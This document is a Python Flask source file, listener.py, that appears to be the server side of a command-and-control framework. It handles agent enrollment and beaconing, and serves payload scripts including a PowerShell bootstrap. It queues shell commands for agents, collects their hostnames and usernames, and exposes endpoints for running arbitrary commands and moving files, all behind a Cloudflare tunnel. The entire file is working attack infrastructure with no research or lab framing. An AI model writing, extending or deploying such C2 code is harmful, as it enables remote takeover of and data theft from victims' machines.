"""
listener.py — runs on the VPS.
Handles:
  - Agent enrollment (/init)
  - File serving (/svc.py, /install.py, /bootstrap.ps1)
  - Agent C2 beacon endpoint (/c2/beacon)
  - Operator control endpoints (execute, download, upload, mcp start/stop/status/logs)

Requirements: pip install flask
              cloudflared in PATH, named tunnel configured
Start: python listener.py
"""

import collections
import hashlib
import hmac as _hmac_mod
import logging
import os
import subprocess
import sys
import tempfile
import threading
import time

from flask import Flask, request, jsonify, send_file
from agent_config import SECRET, ENROLL_KEY, MCP_PORT, LISTENER_PORT, MCP_URL, TUNNEL_NAME
import broker_db as db

logging.getLogger("werkzeug").setLevel(logging.ERROR)

app = Flask(__name__)

_mcp_server_proc = None
_mcp_lock = threading.Lock()
_mcp_log_path = os.path.join(tempfile.gettempdir(), "mcp_server.log")

# Long-poll support: one Event per agent, fired the instant a task is queued
_agent_events      = {}   # agent_id -> threading.Event
_agent_events_lock = threading.Lock()
LONG_POLL_TIMEOUT  = 15   # seconds to hold an idle beacon connection

# Rate limiting for /init: 60 requests per IP per hour
_init_rate   = collections.defaultdict(list)
_init_lock   = threading.Lock()
RATE_LIMIT   = 60
RATE_WINDOW  = 3600

HERE = os.path.dirname(os.path.abspath(__file__))


def _check_secret(data: dict) -> bool:
    return data.get("secret") == SECRET


def _real_ip():
    return request.headers.get("CF-Connecting-IP") or request.remote_addr


# ---------------------------------------------------------------------------
# Enrollment endpoint
# ---------------------------------------------------------------------------

@app.route("/init", methods=["POST"])
def init_enroll():
    ip = _real_ip()
    now = time.time()
    with _init_lock:
        window_start = now - RATE_WINDOW
        _init_rate[ip] = [t for t in _init_rate[ip] if t > window_start]
        if len(_init_rate[ip]) >= RATE_LIMIT:
            return jsonify({"error": "rate limited"}), 429
        _init_rate[ip].append(now)

    data     = request.get_json(silent=True) or {}
    agent_id = data.get("agent_id", "").strip()
    token    = data.get("token", "")

    expected = _hmac_mod.new(ENROLL_KEY.encode(), agent_id.encode(), hashlib.sha256).hexdigest()
    if not agent_id or not _hmac_mod.compare_digest(token, expected):
        return jsonify({"error": "unauthorized"}), 401

    print(f"[init] enrolled: {agent_id} from {ip}")
    return jsonify({"c2_url": f"https://{request.host}", "secret": SECRET})


# ---------------------------------------------------------------------------
# File serving (gated by enroll key)
# ---------------------------------------------------------------------------

def _serve_file(filename):
    if request.args.get("enroll") != ENROLL_KEY:
        return jsonify({"error": "not found"}), 404
    path = os.path.join(HERE, filename)
    if not os.path.isfile(path):
        return jsonify({"error": "not found"}), 404
    return send_file(path, mimetype="text/plain")


@app.route("/svc.py")
def serve_svc():
    return _serve_file("svc.py")


@app.route("/install.py")
def serve_install():
    return _serve_file("install.py")


@app.route("/bootstrap.ps1")
def serve_bootstrap():
    return _serve_file("bootstrap.ps1")


# ---------------------------------------------------------------------------
# Operator control routes
# ---------------------------------------------------------------------------

@app.route("/execute", methods=["POST"])
def execute():
    data = request.get_json(silent=True) or {}
    if not _check_secret(data):
        return jsonify({"status": "error", "output": "unauthorized"}), 403

    command = data.get("command", "")
    print(f"[+] execute: {command}")

    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=60
        )
        output = result.stdout
        if result.stderr:
            output += "\n[stderr]\n" + result.stderr
        return jsonify({
            "status": "ok" if result.returncode == 0 else "error",
            "output": output.strip(),
        })
    except subprocess.TimeoutExpired:
        return jsonify({"status": "error", "output": "timed out after 60s"})
    except Exception as e:
        return jsonify({"status": "error", "output": str(e)})


@app.route("/download", methods=["POST"])
def download():
    data = request.get_json(silent=True) or {}
    if not _check_secret(data):
        return jsonify({"status": "error", "output": "unauthorized"}), 403

    path = data.get("path", "")
    print(f"[+] download: {path}")

    if not os.path.isfile(path):
        return jsonify({"status": "error", "output": f"file not found: {path}"}), 404

    return send_file(path, as_attachment=True)


@app.route("/upload", methods=["POST"])
def upload():
    if request.form.get("secret") != SECRET:
        return jsonify({"status": "error", "output": "unauthorized"}), 403

    dest = request.form.get("dest", "")
    file = request.files.get("file")

    if not file or not dest:
        return jsonify({"status": "error", "output": "missing file or dest"}), 400

    print(f"[+] upload: {dest}")

    try:
        dest_dir = os.path.dirname(dest)
        if dest_dir:
            os.makedirs(dest_dir, exist_ok=True)
        file.save(dest)
        size = os.path.getsize(dest)
        return jsonify({"status": "ok", "output": f"saved {size:,} bytes to {dest}"})
    except Exception as e:
        return jsonify({"status": "error", "output": str(e)}), 500


@app.route("/mcp/start", methods=["POST"])
def mcp_start():
    data = request.get_json(silent=True) or {}
    if not _check_secret(data):
        return jsonify({"status": "error", "output": "unauthorized"}), 403

    global _mcp_server_proc

    with _mcp_lock:
        if _mcp_server_proc and _mcp_server_proc.poll() is None:
            print("[+] MCP server already running")
            return jsonify({"status": "already_running", "url": MCP_URL})

        subprocess.run(f"fuser -k {MCP_PORT}/tcp", shell=True, capture_output=True)
        time.sleep(0.5)

        env = os.environ.copy()
        env["PORT"] = str(MCP_PORT)
        env["HOST"] = "127.0.0.1"
        env["TOKEN"] = SECRET
        script = os.path.join(HERE, "remote_agent_server.py")
        log_fh = open(_mcp_log_path, "w")
        _mcp_server_proc = subprocess.Popen(
            [sys.executable, script],
            env=env,
            stdout=log_fh,
            stderr=log_fh,
        )
        print(f"[+] MCP server started (pid {_mcp_server_proc.pid}) on 127.0.0.1:{MCP_PORT}")

        time.sleep(3)
        if _mcp_server_proc.poll() is not None:
            log_fh.flush()
            with open(_mcp_log_path) as lf:
                crash_log = lf.read().strip()
            print(f"[!] MCP server crashed:\n{crash_log}")
            return jsonify({
                "status": "error",
                "output": f"MCP server crashed on startup. Log:\n{crash_log}",
            }), 500

    print(f"[+] MCP available at: {MCP_URL}")
    return jsonify({"status": "started", "url": MCP_URL, "pid": _mcp_server_proc.pid})


@app.route("/mcp/stop", methods=["POST"])
def mcp_stop():
    data = request.get_json(silent=True) or {}
    if not _check_secret(data):
        return jsonify({"status": "error", "output": "unauthorized"}), 403

    global _mcp_server_proc

    with _mcp_lock:
        stopped = []
        if _mcp_server_proc and _mcp_server_proc.poll() is None:
            _mcp_server_proc.terminate()
            try:
                _mcp_server_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                _mcp_server_proc.kill()
            stopped.append("mcp_server")
        _mcp_server_proc = None

    print(f"[+] MCP stopped: {stopped}")
    return jsonify({"status": "stopped", "stopped": stopped})


@app.route("/mcp/logs", methods=["POST"])
def mcp_logs():
    data = request.get_json(silent=True) or {}
    if not _check_secret(data):
        return jsonify({"status": "error", "output": "unauthorized"}), 403

    if not os.path.exists(_mcp_log_path):
        return jsonify({"status": "ok", "output": "(no log file yet)"})

    try:
        with open(_mcp_log_path) as f:
            lines = f.readlines()
        return jsonify({"status": "ok", "output": "".join(lines[-100:])})
    except Exception as e:
        return jsonify({"status": "error", "output": str(e)})


@app.route("/mcp/status", methods=["POST"])
def mcp_status():
    data = request.get_json(silent=True) or {}
    if not _check_secret(data):
        return jsonify({"status": "error", "output": "unauthorized"}), 403

    running = _mcp_server_proc is not None and _mcp_server_proc.poll() is None
    if not running:
        if sys.platform == "win32":
            result = subprocess.run(
                ["netstat", "-ano"], capture_output=True, text=True
            )
            running = f"127.0.0.1:{MCP_PORT}" in result.stdout
        else:
            result = subprocess.run(
                ["ss", "-tlnp", f"sport = :{MCP_PORT}"],
                capture_output=True, text=True
            )
            running = f":{MCP_PORT}" in result.stdout
    return jsonify({"running": running, "url": MCP_URL})


# ---------------------------------------------------------------------------
# C2 beacon route
# ---------------------------------------------------------------------------

@app.route("/c2/beacon", methods=["POST"])
def c2_beacon():
    data = request.get_json(silent=True) or {}
    if data.get("secret") != SECRET:
        return jsonify({"error": "unauthorized"}), 403

    agent_id = data.get("agent_id", "").strip()
    if not agent_id:
        return jsonify({"error": "missing agent_id"}), 400

    db.upsert_agent(
        agent_id=agent_id,
        hostname=data.get("hostname", "unknown"),
        os_name=data.get("os", "unknown"),
        username=data.get("username", "unknown"),
        ip=data.get("ip", _real_ip()),
    )

    results = data.get("results", [])
    if results:
        for r in results:
            r.setdefault("agent_id", agent_id)
        db.store_results(results)
        print(f"[c2] {agent_id}: {len(results)} result(s) received")

    tasks = db.pop_tasks(agent_id)

    if not tasks:
        with _agent_events_lock:
            ev = _agent_events.setdefault(agent_id, threading.Event())
            ev.clear()
        tasks = db.pop_tasks(agent_id)
        if not tasks:
            ev.wait(timeout=LONG_POLL_TIMEOUT)
            tasks = db.pop_tasks(agent_id)

    if tasks:
        print(f"[c2] {agent_id}: dispatching {len(tasks)} task(s)")

    return jsonify({"tasks": tasks})


# ---------------------------------------------------------------------------
# Agent tasking routes
# ---------------------------------------------------------------------------

@app.route("/c2/task", methods=["POST"])
def c2_task():
    data = request.get_json(silent=True) or {}
    if not _check_secret(data):
        return jsonify({"status": "error", "output": "unauthorized"}), 403

    agent_id = data.get("agent_id", "").strip()
    cmd = data.get("cmd", "").strip()
    if not agent_id or not cmd:
        return jsonify({"status": "error", "output": "missing agent_id or cmd"}), 400

    task_id = db.queue_task(agent_id, "shell", {"command": cmd})
    print(f"[c2] queued task {task_id} for {agent_id}: {cmd}")
    with _agent_events_lock:
        ev = _agent_events.get(agent_id)
        if ev:
            ev.set()
    return jsonify({"status": "ok", "task_id": task_id})


@app.route("/c2/results/<agent_id>", methods=["GET"])
def c2_results(agent_id):
    if request.args.get("secret") != SECRET:
        return jsonify({"status": "error", "output": "unauthorized"}), 403

    task_id = request.args.get("task_id")
    if task_id:
        row = db.get_result(task_id)
        if row is None:
            return jsonify({"status": "pending"})
        return jsonify({"status": "ok", "result": row})

    import sqlite3
    conn = sqlite3.connect(db.DB_PATH)
    conn.row_factory = sqlite3.Row
    rows = conn.execute(
        "SELECT * FROM results WHERE agent_id=? ORDER BY created_at DESC LIMIT 20",
        (agent_id,)
    ).fetchall()
    conn.close()
    return jsonify({"status": "ok", "results": [dict(r) for r in rows]})


@app.route("/c2/agents", methods=["GET"])
def c2_agents_list():
    if request.args.get("secret") != SECRET:
        return jsonify({"status": "error"}), 403
    import sqlite3, time as _t
    conn = sqlite3.connect(db.DB_PATH)
    conn.row_factory = sqlite3.Row
    rows = conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    conn.close()
    now = _t.time()
    agents = []
    for r in rows:
        d = dict(r)
        last_seen = d.get("last_seen") or 0
        d["online"] = (now - last_seen) < 30
        d["last_seen_ago"] = int(now - last_seen)
        agents.append(d)
    return jsonify({"status": "ok", "agents": agents})


@app.route("/c2/agent/remove", methods=["POST"])
def c2_agent_remove():
    data = request.get_json(silent=True) or {}
    if not _check_secret(data):
        return jsonify({"status": "error", "output": "unauthorized"}), 403
    agent_id = data.get("agent_id", "").strip()
    if not agent_id:
        return jsonify({"status": "error", "output": "missing agent_id"}), 400
    db.delete_agent(agent_id)
    print(f"[c2] removed agent {agent_id}")
    return jsonify({"status": "ok", "output": f"removed {agent_id}"})


# ---------------------------------------------------------------------------
# Tunnel
# ---------------------------------------------------------------------------

def _run_named_tunnel():
    print(f"[*] Starting cloudflared tunnel '{TUNNEL_NAME}'...")
    cf_config = os.path.join(os.path.expanduser("~"), ".cloudflared", "config.yml")
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--config", cf_config, "run"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    for raw in proc.stdout:
        line = raw.decode(errors="ignore").strip()
        if line:
            print(f"[cloudflared] {line}")
    proc.wait()


if __name__ == "__main__":
    db.init_db()
    threading.Thread(target=_run_named_tunnel, daemon=True).start()
    from agent_config import LISTENER_URL, AGENT_ID, INIT_URL
    print(f"[*] Agent ID:  {AGENT_ID}")
    print(f"[*] Listener:  {LISTENER_URL}")
    print(f"[*] Init:      {INIT_URL}/init")
    print(f"[*] MCP:       {MCP_URL}/mcp")
    print(f"[*] C2 beacon: {LISTENER_URL}/c2/beacon")
    app.run(host="127.0.0.1", port=LISTENER_PORT, use_reloader=False)
